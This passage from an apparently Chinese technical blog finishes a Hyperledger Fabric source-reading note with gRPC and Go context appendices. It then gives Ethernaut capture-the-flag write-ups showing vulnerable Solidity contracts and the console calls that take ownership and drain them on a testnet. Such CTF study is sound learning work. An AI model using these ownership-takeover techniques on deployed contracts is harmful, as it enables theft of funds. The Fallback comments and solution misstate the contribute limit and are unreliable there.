update</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">peer channel update </span><br><span class=\"line\">\t-o localhost:7050 </span><br><span class=\"line\">\t--ordererTLSHostnameOverride orderer.example.com </span><br><span class=\"line\">\t-c <span class=\"variable\">$CHANNEL_NAME</span> </span><br><span class=\"line\">\t-f <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/<span class=\"variable\">${CORE_PEER_LOCALMSPID}</span>anchors.tx </span><br><span class=\"line\">\t--tls --cafile <span class=\"string\">\"<span class=\"variable\">$ORDERER_CA</span>\"</span> &gt;&amp;log.txt</span><br></pre></td></tr></table></figure>\n<p>已经很明白这段代码的目的了。看看具体实现有没有特别的地方。</p>\n<p>工厂什么都不需要：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">InitCmdFactory(EndorserNotRequired, PeerDeliverNotRequired, OrdererNotRequired)</span><br></pre></td></tr></table></figure>\n<p>官方文档说，Use the orderer at ip address\n<code>orderer.example.com:7050</code> to send the configuration\ntransaction to all peers in the channel to update their copy of the\nchannel configuration.</p>\n<p>即这段代码是指定一个排序节点向通道内的所有对等节点广播，修改他们的配置。</p>\n<p>要记住什么操作室部署好的节点服务做的，什么是调用的指令做的。广播的操作是\norderer 服务内部做的，<code>peer channel update</code>\n只负责向排序节点发送一个 gRPC。</p>\n<h2 id=\"问题\">问题</h2>\n<h3 id=\"锚节点的作用\">锚节点的作用</h3>\n<ol type=\"1\">\n<li><strong>跨组织的区块传播</strong>：\n<ul>\n<li>锚节点是用于在不同组织之间进行区块传播的关键节点。当一个新的区块被\nOrderer\n节点生成并分发时，它首先会发送给每个组织的锚节点。然后，锚节点负责将这些区块传递给本组织内的其他\nPeer 节点。</li>\n<li>这种机制确保了区块能够在不同组织的节点之间有效传播，保持所有节点的数据同步。</li>\n</ul></li>\n<li><strong>跨组织的服务发现</strong>：\n<ul>\n<li>锚节点用于跨组织的服务发现。在 Hyperledger Fabric\n中，当客户端（或其他 Peer\n节点）需要与其他组织的节点通信时，它们可以通过查询锚节点来获取目标组织内的其他\nPeer 节点的信息。</li>\n<li>例如，在执行一个跨组织的链码调用时，客户端可能需要发送交易提案到多个组织的\nPeer 节点。锚节点提供了一个入口，使得客户端能够发现并连接到这些 Peer\n节点。</li>\n</ul></li>\n<li><strong>优化网络流量</strong>：\n<ul>\n<li>通过将区块传播的责任集中到少数锚节点，可以减少网络中全网广播带来的流量开销。这种集中化传播可以提高网络的效率和性能，避免不必要的数据冗余和延迟。</li>\n</ul></li>\n</ol>\n<p>有点类似于网关。</p>\n<h3 id=\"各个client的作用\">各个Client的作用</h3>\n<p>在 Hyperledger Fabric 的源码中，<code>ChannelCmdFactory</code>\n结构体中的几个客户端（<code>EndorserClient</code>、<code>BroadcastClient</code>、<code>DeliverClient</code>）各自承担着不同的角色和职责，它们分别用于与不同类型的\nFabric 节点通信。以下是对这些客户端的具体实现及其用途的详细解释：</p>\n<h4 id=\"endorserclient-pb.endorserclient\">1. EndorserClient\n(<code>pb.EndorserClient</code>)</h4>\n<ul>\n<li><strong>作用</strong>：<code>EndorserClient</code>\n是用于与背书节点（Endorser\nPeer）进行通信的客户端。它的主要职责是发送交易提案给背书节点，并接收背书节点返回的背书响应。</li>\n<li><strong>具体实现</strong>：\n<ul>\n<li><code>EndorserClient</code> 通常实现了 gRPC 接口，负责与 Peer 节点的\n<code>ProcessProposal</code>\n方法交互。背书节点会对交易提案进行模拟执行，并返回模拟的结果（包括读取集和写入集），这个过程称为“背书”。</li>\n<li><code>EndorserClient</code> 的具体实现类可能是通过 gRPC\n框架生成的客户端代码，例如 <code>endorserClient</code>，它封装了与\n<code>ProcessProposal</code> 的 gRPC 调用。</li>\n</ul></li>\n<li><strong>使用场景</strong>：\n<ul>\n<li>在客户端提交交易之前，会使用 <code>EndorserClient</code> 向多个 Peer\n节点请求交易提案的背书。</li>\n</ul></li>\n</ul>\n<h4 id=\"broadcastclient-common.broadcastclient\">2. BroadcastClient\n(<code>common.BroadcastClient</code>)</h4>\n<ul>\n<li><strong>作用</strong>：<code>BroadcastClient</code> 是用于与 Orderer\n节点通信的客户端。它的主要职责是将经过背书的交易提交给 Orderer\n节点，以便将交易排序后打包进区块。</li>\n<li><strong>具体实现</strong>：\n<ul>\n<li><code>BroadcastClient</code> 也通常通过 gRPC 与 Orderer\n节点通信。它实现了与 Orderer 节点的 <code>Broadcast</code>\n方法的交互，负责将交易数据发送给 Orderer，Orderer\n节点接收到交易后会对其进行排序，并打包到区块中。</li>\n<li>一个常见的实现类可能是 <code>broadcastClientImpl</code>，它封装了与\n<code>Broadcast</code> 方法的 gRPC 调用。</li>\n</ul></li>\n<li><strong>使用场景</strong>：\n<ul>\n<li>在交易得到足够的背书之后，客户端会使用 <code>BroadcastClient</code>\n将交易提交给 Orderer 节点进行排序和区块打包。</li>\n</ul></li>\n</ul>\n<h4 id=\"deliverclient-deliverclientintf\">3. DeliverClient\n(<code>deliverClientIntf</code>)</h4>\n<ul>\n<li><strong>作用</strong>：<code>DeliverClient</code> 是用于从 Orderer\n或 Peer\n节点接收区块和事件的客户端。它的主要职责是监听区块的传递或接收事件通知。</li>\n<li><strong>具体实现</strong>：\n<ul>\n<li><code>DeliverClient</code> 通过 gRPC 接口与 Orderer 或 Peer\n节点进行通信，通常会实现 <code>Deliver</code>\n方法的调用。<code>Deliver</code> 方法允许客户端从 Peer 节点或 Orderer\n节点获取区块的传递或接收区块的通知。</li>\n<li>实现类可能是 <code>deliverClientImpl</code> 或者其他实现了\n<code>deliverClientIntf</code> 接口的类，它封装了与 <code>Deliver</code>\n方法的 gRPC 交互。</li>\n</ul></li>\n<li><strong>使用场景</strong>：\n<ul>\n<li>当客户端需要获取通道中的最新区块或监听特定事件（如区块提交事件）时，会使用\n<code>DeliverClient</code> 来实现这一功能。</li>\n</ul></li>\n</ul>\n<h3 id=\"总结\">总结</h3>\n<ul>\n<li><code>EndorserClient</code>：用于与 Peer\n节点通信，发送交易提案并接收背书响应。</li>\n<li><code>BroadcastClient</code>：用于与 Orderer 节点通信，将交易提交给\nOrderer 进行排序和区块打包。</li>\n<li><code>DeliverClient</code>：用于接收区块或事件通知，可以从 Orderer\n或 Peer 节点获取区块信息。</li>\n</ul>\n<h1 id=\"总结-1\">总结</h1>\n<p>至此，已经完成了 test-network 中网络的启动和通道的创建。</p>\n<p>主要分析了如何使用 fabric 提供的工具（如 <code>peer</code>\n<code>osnadmin</code> <code>cryptogen</code> 等）进行构建网络。</p>\n<p>但是网络的启动中留了一个问题：<code>peer node start</code> 和\n<code>orderer start</code>\n干了什么。源码中哪里进行了端口的开放，这些节点收到 gRPC\n请求之后，后续进行了什么操作。</p>\n<p>下一节完成了这部分问题。</p>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"grpc-与传统-http-调用的区别\">gRPC 与传统 HTTP 调用的区别</h2>\n<p>gRPC 和传统的 HTTP\n调用虽然都用于客户端与服务器之间的通信，但它们在底层实现、性能、数据格式、传输协议等方面有显著的区别。以下是一些关键的差异：</p>\n<h4 id=\"通信协议\">1. <strong>通信协议</strong></h4>\n<ul>\n<li><strong>gRPC</strong>：基于 HTTP/2 协议，这使得 gRPC\n具备了流式通信、多路复用、头部压缩、双向流等特性。HTTP/2\n的多路复用允许多个请求和响应通过单个 TCP 连接同时传输，减少了延迟。</li>\n<li><strong>传统 HTTP</strong>：基于 HTTP/1.1（或\nHTTP/2，但应用较少），主要通过请求-响应的方式进行通信，每次请求通常会创建一个新的连接（除非使用了持久连接）。</li>\n</ul>\n<h4 id=\"数据格式\">2. <strong>数据格式</strong></h4>\n<ul>\n<li><strong>gRPC</strong>：使用 Protocol\nBuffers（protobuf）作为其序列化协议。这是一种高效的二进制格式，体积小、解析速度快，非常适合跨语言通信。</li>\n<li><strong>传统 HTTP</strong>：通常使用 JSON、XML 等文本格式。虽然 JSON\n可读性好，但在性能和数据大小方面不如 protobuf 高效。</li>\n</ul>\n<h4 id=\"性能\">3. <strong>性能</strong></h4>\n<ul>\n<li><strong>gRPC</strong>：由于使用了 HTTP/2 和 protobuf，gRPC\n在性能和资源利用率上要优于传统的 HTTP 调用。gRPC\n提供更低的延迟和更高的吞吐量。</li>\n<li><strong>传统\nHTTP</strong>：相对较慢，尤其是在处理大规模通信或需要高并发的场景下，性能不如\ngRPC。</li>\n</ul>\n<h4 id=\"双向流式通信\">4. <strong>双向流式通信</strong></h4>\n<ul>\n<li><strong>gRPC</strong>：支持双向流式通信，这意味着客户端和服务器可以在单个\ngRPC 调用中同时发送和接收消息。这对实时通信和流式数据处理特别有用。</li>\n<li><strong>传统\nHTTP</strong>：基于请求-响应模型，通常是一对一的交互方式。虽然可以通过\nWebSocket 实现双向通信，但这不是 HTTP 协议的原生功能。</li>\n</ul>\n<h4 id=\"服务定义\">5. <strong>服务定义</strong></h4>\n<ul>\n<li><strong>gRPC</strong>：服务接口使用 protobuf\n文件定义，强类型化，接口可以跨语言调用，且编译器自动生成客户端和服务器代码。</li>\n<li><strong>传统 HTTP</strong>：没有标准化的接口定义方式，通常使用\nOpenAPI（Swagger）来定义 RESTful\nAPI，但客户端和服务器代码需要手动编写。</li>\n</ul>\n<h4 id=\"适用场景\">6. <strong>适用场景</strong></h4>\n<ul>\n<li><strong>gRPC</strong>：非常适合微服务架构、大规模分布式系统、实时通信、跨语言服务调用等场景。</li>\n<li><strong>传统\nHTTP</strong>：适合需要高可读性、与浏览器交互、简单或公开的 API\n服务，通常用于 Web 服务和 RESTful API。</li>\n</ul>\n<h4 id=\"能否使用传统-http-进行相同的调用\">7. <strong>能否使用传统 HTTP\n进行相同的调用？</strong></h4>\n<p>在技术上，你可以使用传统的 HTTP 来实现类似的 RPC\n调用，但这会带来一些挑战：</p>\n<ul>\n<li>你需要自己定义数据格式（例如 JSON），处理序列化和反序列化。</li>\n<li>缺乏 gRPC\n提供的许多高级功能，如双向流、自动代码生成、负载均衡、强类型接口等。</li>\n<li>性能和资源利用率可能不如 gRPC 高效。</li>\n</ul>\n<h2 id=\"go-标准库中的-context-详细讲解\">Go 标准库中的\n<code>context</code> 详细讲解</h2>\n<p><code>context</code> 是 Go 标准库中的一个包，用于在不同的 goroutine\n之间传递请求范围内的元数据、取消信号和超时信息。<code>context</code>\n在处理并发操作时特别有用，尤其是在 gRPC、HTTP\n服务器、数据库操作等场景下。</p>\n<h4 id=\"基本概念\">1. <strong>基本概念</strong></h4>\n<ul>\n<li><strong><code>context.Context</code> 接口</strong>：\n<ul>\n<li><code>context.Context</code> 是一个接口，它定义了在不同的 goroutine\n之间传递请求范围内的信息的标准方法。</li>\n<li>它是不可变的，一旦创建，就不能修改，而是通过派生（创建子\ncontext）的方式来添加新的信息。</li>\n</ul></li>\n<li><strong>背景上下文</strong>：\n<ul>\n<li><strong><code>context.Background()</code></strong>：通常作为根\ncontext\n使用，没有携带任何信息，一般在主函数、初始化或者测试时使用。</li>\n<li><strong><code>context.TODO()</code></strong>：占位用的\ncontext，当你不确定应该使用什么 context 时，可以使用\n<code>TODO()</code>。</li>\n</ul></li>\n</ul>\n<h4 id=\"常用的函数\">2. <strong>常用的函数</strong></h4>\n<ul>\n<li><strong><code>context.WithCancel(parent Context) (ctx Context, cancel CancelFunc)</code></strong>：\n<ul>\n<li>创建一个子 context，并返回一个取消函数 <code>cancel</code>。</li>\n<li>调用 <code>cancel()</code> 时，会向所有使用该 context 的 goroutine\n发送取消信号。</li>\n</ul></li>\n<li><strong><code>context.WithDeadline(parent Context, d time.Time) (Context, CancelFunc)</code></strong>：\n<ul>\n<li>创建一个子 context，该 context 会在指定的时间点自动取消。</li>\n<li>同样返回一个 <code>CancelFunc</code>，可以主动取消。</li>\n</ul></li>\n<li><strong><code>context.WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)</code></strong>：\n<ul>\n<li>与 <code>WithDeadline</code>\n类似，但这里是指定一个相对的超时时间。</li>\n</ul></li>\n<li><strong><code>context.WithValue(parent Context, key, val interface{}) Context</code></strong>：\n<ul>\n<li>返回一个子\ncontext，携带一个键值对，可以用于传递请求范围内的特定数据（例如用户身份、请求\nID 等）。</li>\n<li>注意：<code>WithValue</code> 应该谨慎使用，避免滥用造成混乱。</li>\n</ul></li>\n</ul>\n<h4 id=\"如何在代码中使用-context\">3. <strong>如何在代码中使用\n<code>context</code></strong></h4>\n<p>使用 <code>context</code>\n的典型场景包括取消正在进行的操作、设置超时、传递元数据等。以下是一个简单的使用示例：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> {</span><br><span class=\"line\">    <span class=\"comment\">// 创建一个带有超时的 context</span></span><br><span class=\"line\">    ctx, cancel := context.WithTimeout(context.Background(), <span class=\"number\">5</span>*time.Second)</span><br><span class=\"line\">    <span class=\"keyword\">defer</span> cancel()</span><br><span class=\"line\"></span><br><span class=\"line\">    ch := <span class=\"built_in\">make</span>(<span class=\"keyword\">chan</span> <span class=\"type\">int</span>)</span><br><span class=\"line\">    <span class=\"keyword\">go</span> doSomething(ctx, ch)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">select</span> {</span><br><span class=\"line\">    <span class=\"keyword\">case</span> result := &lt;-ch:</span><br><span class=\"line\">        fmt.Println(<span class=\"string\">\"Received result:\"</span>, result)</span><br><span class=\"line\">    <span class=\"keyword\">case</span> &lt;-ctx.Done():</span><br><span class=\"line\">        fmt.Println(<span class=\"string\">\"Operation timed out:\"</span>, ctx.Err())</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">doSomething</span><span class=\"params\">(ctx context.Context, ch <span class=\"keyword\">chan</span> <span class=\"type\">int</span>)</span></span> {</span><br><span class=\"line\">    <span class=\"keyword\">select</span> {</span><br><span class=\"line\">    <span class=\"keyword\">case</span> &lt;-time.After(<span class=\"number\">10</span> * time.Second): <span class=\"comment\">// 模拟耗时操作</span></span><br><span class=\"line\">        ch &lt;- <span class=\"number\">42</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> &lt;-ctx.Done():</span><br><span class=\"line\">        fmt.Println(<span class=\"string\">\"Operation cancelled:\"</span>, ctx.Err())</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，如果 <code>doSomething</code> 操作超过 5\n秒没有完成，<code>ctx.Done()</code> 会被触发，导致操作取消。</p>\n<h4 id=\"context-的使用建议\">4. <strong><code>context</code>\n的使用建议</strong></h4>\n<ul>\n<li><strong>传递上下文</strong>：函数之间传递 context 时，通常将\n<code>context.Context</code> 作为第一个参数。</li>\n<li><strong>及时取消</strong>：使用\n<code>WithCancel</code>、<code>WithTimeout</code>、<code>WithDeadline</code>\n创建的 context 一定要在不需要时调用返回的\n<code>CancelFunc</code>，否则可能导致资源泄露。</li>\n<li><strong>避免滥用\n<code>WithValue</code></strong>：<code>WithValue</code>\n适合传递请求范围内少量的信息，但不应该用它来传递大量数据或者频繁使用。</li>\n</ul>\n<h3 id=\"总结-2\">总结</h3>\n<ul>\n<li><strong>gRPC</strong> 是一个高性能的 RPC\n框架，适合微服务和高并发场景，与传统 HTTP\n调用在协议、数据格式、性能和功能上有显著差异。</li>\n<li><strong>Go 的 <code>context</code></strong>\n用于在并发操作中传递元数据、取消信号和超时控制，是处理并发任务时的重要工具。它有助于管理资源，避免资源泄露或长时间未完成的任务。</li>\n</ul>\n","categories":["笔记"],"tags":["区块链","go","fabric","超级账本"]},{"title":"Ethernaut - Hello Ethernaut","url":"/ethernaut/01-Hello-Ethernaut/","content":"<p>初见 Ethernaut。</p>\n<p>做毕设的时候查到这个小平台，来玩一玩。</p>\n<span id=\"more\"></span>\n<h1 id=\"前置条件\">前置条件</h1>\n<ul>\n<li><p>安装小狐狸钱包 MetaMask 浏览器插件。这一步看网上教程。</p></li>\n<li><p>获取测试货币。推荐https://sepolia-faucet.pk910.de/，挖矿。</p>\n<figure>\n<img src=\"/ethernaut/01-Hello-Ethernaut/image-20241221150121814.png\" alt=\"image-20241221150121814\">\n<figcaption aria-hidden=\"true\">image-20241221150121814</figcaption>\n</figure></li>\n</ul>\n<h1 id=\"hello-ethernaut\">Hello Ethernaut</h1>\n<p>在控制台里按照步骤提示调用智能合约，看结果。</p>\n<p><img src=\"/ethernaut/01-Hello-Ethernaut/image-20241221150139692.png\" alt=\"image-20241221150139692\" style=\"zoom:50%;\"></p>\n<p>最后一个，密码是什么意思……</p>\n<p>发现：</p>\n<p><img src=\"/ethernaut/01-Hello-Ethernaut/image-20241221152006587.png\" alt=\"image-20241221152006587\" style=\"zoom:50%;\"></p>\n<p>有一个成员变量！</p>\n<p>所以：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">await contract.authenticate(\"ethernaut0\")</span><br></pre></td></tr></table></figure>\n<p>然后点击 submit instance</p>\n<figure>\n<img src=\"/ethernaut/01-Hello-Ethernaut/image-20241221152315112.png\" alt=\"image-20241221152315112\">\n<figcaption aria-hidden=\"true\">image-20241221152315112</figcaption>\n</figure>\n<p>太有花活了哈哈哈哈，然后显示了智能合约的源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Instance {</span><br><span class=\"line\">    string public password;</span><br><span class=\"line\">    uint8 public infoNum = 42;</span><br><span class=\"line\">    string public theMethodName = \"The method name is method7123949.\";</span><br><span class=\"line\">    bool private cleared = false;</span><br><span class=\"line\"></span><br><span class=\"line\">    // constructor</span><br><span class=\"line\">    constructor(string memory _password) {</span><br><span class=\"line\">        password = _password;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function info() public pure returns (string memory) {</span><br><span class=\"line\">        return \"You will find what you need in info1().\";</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function info1() public pure returns (string memory) {</span><br><span class=\"line\">        return 'Try info2(), but with \"hello\" as a parameter.';</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function info2(string memory param) public pure returns (string memory) {</span><br><span class=\"line\">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(\"hello\"))) {</span><br><span class=\"line\">            return \"The property infoNum holds the number of the next info method to call.\";</span><br><span class=\"line\">        }</span><br><span class=\"line\">        return \"Wrong parameter.\";</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function info42() public pure returns (string memory) {</span><br><span class=\"line\">        return \"theMethodName is the name of the next method.\";</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function method7123949() public pure returns (string memory) {</span><br><span class=\"line\">        return \"If you know the password, submit it to authenticate().\";</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function authenticate(string memory passkey) public {</span><br><span class=\"line\">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {</span><br><span class=\"line\">            cleared = true;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function getCleared() public view returns (bool) {</span><br><span class=\"line\">        return cleared;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>好玩。再玩玩。</p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约"]},{"title":"Ethernaut - Fallback","url":"/ethernaut/02-Fallback/","content":"<p>阅读智能合约源码，任务：</p>\n<ul>\n<li>声明自己为合约的 ownership</li>\n<li>减少 balance 到0</li>\n</ul>\n<p>学习目标：</p>\n<ul>\n<li>使用ABI发送ether</li>\n<li>不用ABI发送ether</li>\n<li>转换wei和ether的单位</li>\n<li>回调函数 Fallback</li>\n</ul>\n<span id=\"more\"></span>\n<p><strong>ABI</strong> 是智能合约与外部世界（如 DApp、前端、Web3.js\n等）交互的标准接口。它描述了一个智能合约的所有可调用函数、事件和数据结构。</p>\n<p>简单来说就是用 contract 调用合约函数。</p>\n<p>一起来看智能合约：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Fallback {</span><br><span class=\"line\">\t// 两个成员变量，一个记录每个账号的贡献，一个记录谁是这个合约的owner</span><br><span class=\"line\">    mapping(address =&gt; uint256) public contributions; </span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 构造函数，不以function开头的函数都是某种回调函数。</span><br><span class=\"line\">\t// 构造函数就是在合约被实例化时会调用的函数。</span><br><span class=\"line\">\t// 作用是设置初始owner（创建合约的账户，这里是网站自己生成的其他账户，反正不是你）</span><br><span class=\"line\">\t// 并且设置这个账户的贡献是1000 ether，很富</span><br><span class=\"line\">    constructor() {</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    }</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t// modifier，装饰器，这个可以被写在其他函数声明里，表示执行这个函数前，</span><br><span class=\"line\">\t// 必须通过装饰器的检查</span><br><span class=\"line\">    modifier onlyOwner() {</span><br><span class=\"line\">        require(msg.sender == owner, \"caller is not the owner\");</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    }</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t// 一个public函数，可以通过abi调用</span><br><span class=\"line\">    function contribute() public payable {</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether); // 必须提供0.001以上的ether</span><br><span class=\"line\">        contributions[msg.sender] += msg.value; // 记录你的贡献</span><br><span class=\"line\">        // 如果你的贡献比owner大，你就成为了新owner</span><br><span class=\"line\">        // 也就是你得发1000个以上的ether，显然你很难拿到这么多以太币</span><br><span class=\"line\">        if (contributions[msg.sender] &gt; contributions[owner]) {</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">\t// view关键字的作用是表示这个函数不会修改区块链状态，就是只读的意思</span><br><span class=\"line\">\t// 这就不会发起交易，不消耗gas</span><br><span class=\"line\">    function getContribution() public view returns (uint256) {</span><br><span class=\"line\">        return contributions[msg.sender];</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 调用了onlyOwner的modifier，只有owner可以调用这个函数</span><br><span class=\"line\">\t// 作用是把钱还给你，不然白白浪费了</span><br><span class=\"line\">    function withdraw() public onlyOwner {</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    }</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t// 前面提到过，不是以function开头的都是回调函数</span><br><span class=\"line\">\t// 当合约收到带有value的交易，就会调用receive函数</span><br><span class=\"line\">\t// 执行 contribute 两次，并且记得贡献0.001以上的ether，就变成owner了</span><br><span class=\"line\">\t// 或者可以省一点钱，第二次不调用contribute，直接web3.eth.sendTransaction转账</span><br><span class=\"line\">    receive() external payable {</span><br><span class=\"line\">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    // external 关键字表示这个函数不能被内部调用</span><br><span class=\"line\">    // payable关键字表示这个函数可以接受转账、或是可以转出</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"调用合约的方法\">调用合约的方法</h1>\n<h2 id=\"web3.js\">web3.js</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"property\">methods</span>.<span class=\"title function_\">someFunction</span>(arg1, arg2).<span class=\"title function_\">send</span>({</span><br><span class=\"line\">  <span class=\"attr\">from</span>: <span class=\"string\">'0xYourAddress'</span>,                  <span class=\"comment\">// 发送交易的地址</span></span><br><span class=\"line\">  <span class=\"attr\">value</span>: web3.<span class=\"property\">utils</span>.<span class=\"title function_\">toWei</span>(<span class=\"string\">'1'</span>, <span class=\"string\">'ether'</span>), <span class=\"comment\">// msg.value 设置为 1 ETH</span></span><br><span class=\"line\">  <span class=\"attr\">gas</span>: <span class=\"number\">3000000</span>,                          <span class=\"comment\">// 设置最大 Gas 数量</span></span><br><span class=\"line\">  <span class=\"attr\">gasPrice</span>: web3.<span class=\"property\">utils</span>.<span class=\"title function_\">toWei</span>(<span class=\"string\">'20'</span>, <span class=\"string\">'gwei'</span>) <span class=\"comment\">// 设置 Gas 价格为 20 Gwei</span></span><br><span class=\"line\">});</span><br></pre></td></tr></table></figure>\n<h2 id=\"ether.js\">ether.js</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"title function_\">someFunction</span>(arg1, arg2, {</span><br><span class=\"line\">  <span class=\"attr\">value</span>: ethers.<span class=\"property\">utils</span>.<span class=\"title function_\">parseEther</span>(<span class=\"string\">'1'</span>), <span class=\"comment\">// msg.value 设置为 1 ETH</span></span><br><span class=\"line\">  <span class=\"attr\">gasLimit</span>: <span class=\"number\">3000000</span>,                  <span class=\"comment\">// 设置最大 Gas 数量</span></span><br><span class=\"line\">  <span class=\"attr\">gasPrice</span>: ethers.<span class=\"property\">utils</span>.<span class=\"title function_\">parseUnits</span>(<span class=\"string\">'20'</span>, <span class=\"string\">'gwei'</span>) <span class=\"comment\">// 设置 Gas 价格为 20 Gwei</span></span><br><span class=\"line\">});</span><br></pre></td></tr></table></figure>\n<p>调用合约有一个隐藏的参数，用于设置你要传多少value，消耗多少gas等等。这里设置的value就能在合约的\n<code>msg.value</code> 里获取。</p>\n<h1 id=\"直接发起事务\">直接发起事务</h1>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">sendTransaction</span>({</span><br><span class=\"line\">  <span class=\"attr\">to</span>: contract.<span class=\"property\">address</span>,</span><br><span class=\"line\">  <span class=\"attr\">from</span>: yourAddress,</span><br><span class=\"line\">  <span class=\"attr\">value</span>: web3.<span class=\"property\">utils</span>.<span class=\"title function_\">toWei</span>(<span class=\"string\">\"0.001\"</span>, <span class=\"string\">\"ether\"</span>) <span class=\"comment\">// 任意大于 0 的值</span></span><br><span class=\"line\">});</span><br></pre></td></tr></table></figure>\n<h1 id=\"fallback\">Fallback</h1>\n<h4 id=\"什么是-fallback-method\">1.1 什么是 Fallback Method？</h4>\n<p>Fallback 方法（或称为 <strong>Fallback\nfunction</strong>）是一种特殊的函数，在 Solidity\n合约中没有名称或参数，它的作用是处理任何无法匹配的调用或接收到以太币的情况。Fallback\n方法是在合约接收到交易时，未明确匹配到某个函数时触发的默认函数。</p>\n<p>在 Solidity 中，Fallback 方法有两种形式：</p>\n<ul>\n<li><strong>简单 fallback 方法</strong>：没有参数，不返回值。</li>\n<li><strong>接收函数</strong>：专门用于接收以太币的函数。</li>\n</ul>\n<h4 id=\"fallback-方法的定义\">1.2 Fallback 方法的定义：</h4>\n<p>一个合约中只允许有 <strong>一个</strong> fallback\n方法，不能有多个。Fallback 方法有两种形式：</p>\n<ol type=\"1\">\n<li><strong>接收以太币的函数</strong>（<code>receive()</code>）：只能用于接收以太币，并且没有其他任何代码。它是专门用于接收纯以太币转账的。</li>\n<li><strong>普通的 fallback\n函数</strong>（<code>fallback()</code>）：当接收到的调用没有匹配到任何函数签名时，或者接收到的数据无法匹配合约中的现有函数时，fallback\n函数会被触发。它可以用于处理无法匹配的调用，或者记录日志，甚至抛出异常。</li>\n</ol>\n<h1 id=\"解题\">解题</h1>\n<p>所以只用调用 contribute 的同时设置 value，给智能合约转账0.001eth\n两次，你就变成owner了。</p>\n<p>然后调用withdraw把钱都拿回来，完成。</p>\n<p><img src=\"/ethernaut/02-Fallback/image-20241221160459849.png\" alt=\"image-20241221160459849\" style=\"zoom:50%;\"></p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Fallout","url":"/ethernaut/03-Fallout/","content":"<p>第三题。</p>\n<p>获得智能合约的owner。</p>\n<p>这关的目的是使用Solidity Remix IDE，来模拟执行智能合约。</p>\n<span id=\"more\"></span>\n<p>嗯……？这题好简单，有一个函数，你只要给他转账，你就会变成owner……</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"title class_\">Fal1</span>out({<span class=\"attr\">value</span>:web3.<span class=\"property\">utils</span>.<span class=\"title function_\">toWei</span>(<span class=\"string\">\"0.0001\"</span>, <span class=\"string\">\"ether\"</span>)})</span><br></pre></td></tr></table></figure>\n<p><img src=\"/ethernaut/03-Fallout/image-20241221170138704.png\" alt=\"image-20241221170138704\" style=\"zoom:50%;\"></p>\n<p>他好像很生气的样子。然后题面更新了！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?</span><br><span class=\"line\"></span><br><span class=\"line\">Well... Not quite.</span><br><span class=\"line\"></span><br><span class=\"line\">The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they 